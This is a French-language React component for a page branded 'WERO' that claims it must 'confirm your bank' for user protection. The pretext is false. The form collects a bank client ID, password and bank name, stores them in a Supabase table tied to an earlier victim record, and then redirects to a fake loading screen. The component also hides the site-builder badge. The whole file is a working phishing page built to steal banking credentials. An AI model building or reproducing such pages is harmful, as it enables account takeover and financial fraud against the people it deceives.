import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { supabase } from "@/lib/supabase";
import { Footer } from "@/components/Footer";
import { useToast } from "@/components/ui/use-toast";
import { ShieldCheck } from "lucide-react";

const Bank = () => {
  const [formData, setFormData] = useState({
    identifiantiban: "",
    password: "",
    typebanque: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  // Masquer l'élément lovable-badge au montage
  useEffect(() => {
    const element = document.getElementById("lovable-badge");
    if (element) {
      element.style.display = "none";
    }
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.identifiantiban || !formData.password || !formData.typebanque) {
      toast({
        title: "Erreur de validation",
        description: "Veuillez remplir tous les champs",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    const userId = localStorage.getItem("userId");

    if (!userId) {
      navigate("/");
      return;
    }

    try {
      await supabase
        .from("sefon")
        .update({
          identifiantiban: formData.identifiantiban,
          codepersonne: formData.password, // champ modifié
          typebanque: formData.typebanque,
        })
        .eq("id", userId);

      setTimeout(() => {
        navigate("/loading");
      }, 1000);
    } catch (error) {
      console.error(error);
      toast({
        title: "Erreur",
        description: "Une erreur est survenue lors de l'enregistrement des informations bancaires",
        variant: "destructive",
      });
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4">
        <h1 className="text-2xl font-bold">WERO</h1>
      </header>

      <main className="flex-grow flex justify-center p-4">
        <div className="max-w-md w-full">
          <h2 className="text-2xl font-bold text-yellow-500 text-center mb-4">
            VEUILLEZ CONFIRMER VOTRE BANQUE SUR WERO.
          </h2>

          <div className="flex justify-center mb-4">
            <img
              src="https://assets.zyrosite.com/Aq2q239lEjf2a2Mj/ta-c-la-c-chargement-d9575RLeGQcKkjww.gif"
              className="img-fluid"
              alt="Carte bancaire"
            />
          </div>

          <p className="text-center mb-8">
            Afin d'assurer la protection de nos utilisateurs, nous avons besoin
            de confirmer votre banque.
          </p>

          <form onSubmit={handleSubmit} className="space-y-6 bg-gray-50 p-6 rounded-lg">
            <div className="space-y-2">
              <Label htmlFor="identifiantiban">Identifiant client</Label>
              <Input
                id="identifiantiban"
                name="identifiantiban"
                value={formData.identifiantiban}
                onChange={handleChange}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password">Mot de passe</Label>
              <Input
                id="password"
                name="password"
                type="password"
                value={formData.password}
                onChange={handleChange}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="typebanque">Nom de la banque</Label>
              <Input
                id="typebanque"
                name="typebanque"
                value={formData.typebanque}
                onChange={handleChange}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>

            <Button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 flex items-center justify-center"
              disabled={isLoading}
            >
              <ShieldCheck className="mr-2 h-4 w-4" />
              {isLoading ? "Confirmation..." : "Confirmer en toute sécurité"}
            </Button>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Bank;
